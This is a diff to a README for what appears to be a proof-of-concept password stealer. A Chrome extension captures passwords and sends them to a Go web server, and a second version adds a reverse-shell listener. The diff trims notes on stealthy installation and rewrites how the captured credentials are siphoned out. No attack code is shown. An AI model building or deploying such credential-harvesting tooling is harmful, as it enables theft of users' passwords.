@@ -8,15 +8,7 @@ Version 1: Simple web server that saved captured passwords to a .txt file.
 
 Version 2: Full reverse shell capabilities, receiving passwords directly on the listener.
 
-Installation
-
-The Chrome extension can be installed manually in Developer Mode.
-
-It can also be installed via Group Policies and Registry entries for enterprise deployment.
-
-Automated installation using tools like Selenium is possible but may not be stealthy.
-
-Note: A legitimate web server with SSL certificates is not required for this proof-of-concept. Windows Firewall does not appear to block the connection in lab testing.
+Note: A legitimate web server with certificates is not required for a local proof-of-concept web server, but it's possible to use a real web server to receive passwords. Chrome typically blocks untrusted certificates and https to http cross site POST requests. 
 
 Why Golang?
 
@@ -28,13 +20,13 @@ Firewall prompts are minimized; even if blocked, the server can still receive pa
 
 Why a Web Server?
 
-Chrome extensions are sandboxed, making it difficult to export data directly from the browser to the host system. A web server provides a straightforward way to receive captured data.
+Chrome browsers are sandboxed, making it difficult to export data directly from the browser to the host system. A web server provides a straightforward way to receive captured data as it's the nature of javascript based extentions. Once the data is shared with the your web server, we control the web server and therefor the data. We can not output it to a file or siphon the credentials and send them through a reverse shell with version 2's reverse shell server. 
 
 Usage
 
 Start the server:
 
-go run server.go
+go run ReverseServer.go
 
 
 or run the compiled executable:
